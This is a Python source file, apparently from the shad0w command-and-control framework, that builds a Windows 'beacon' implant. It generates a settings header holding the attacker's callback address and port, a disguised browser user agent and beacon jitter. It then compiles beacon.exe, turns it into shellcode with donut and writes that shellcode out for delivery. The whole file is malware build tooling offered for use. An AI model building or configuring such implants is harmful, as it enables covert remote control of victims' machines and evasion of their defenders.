import os

from lib import shellcode

def clone_source_files():
    # move the source files of the beacon over
    # to the build directory

    # put us in the correct dir (this obviously needs to be inside docker)
    os.chdir("/root/shad0w/beacon")

    # why reinvent the wheel? lets jus use cp
    os.popen("cp src/*.c build/")
    os.popen("cp src/*.h build/")
    os.popen("cp src/Makefile build/")

    return

def update_settings_file(shad0wbuild):
    # update the settings so that when we build
    # we will use our new args

    # this is hardcoded so will need docker
    settings_path = "/root/shad0w/beacon/build/settings.h"

    # make our settings.h file
    settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
#define _C2_CALLBACK_PORT %s
#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"

#define _CALLBACK_JITTER %s000""" % (shad0wbuild.address, shad0wbuild.port, shad0wbuild.jitter)

    # and just write it
    with open(settings_path, 'w') as file:
        file.write(settings_template)
    
    return

def make_in_clone():
    # build the beacon from the source files
    # held inside the build directory

    # we should already be here but this is just to make sure
    os.chdir("/root/shad0w/beacon/build")

    # and lets make
    os.popen("make").read()

    # check that our beacon was actually made
    try:
        open("/root/shad0w/beacon/beacon.exe", 'rb')
    except FileNotFoundError:
        print("ERROR: building beacon")
        exit(-1)
    
    return

def extract_shellcode():
    # use donut to extract the shellcode from
    # our newly created beacon

    beacon_file = "/root/shad0w/beacon/beacon.exe"

    # use donut to get it
    code = shellcode.generate(beacon_file, None, None, parse=False)

    return code

def write_and_bridge(filename, rcode):
    # write the supplied code to the file given
    # by the user and then make sure they can access it

    # might change this?
    os.chdir("/root/shad0w/bridge")

    with open(filename, 'wb') as file:
        file.write(rcode)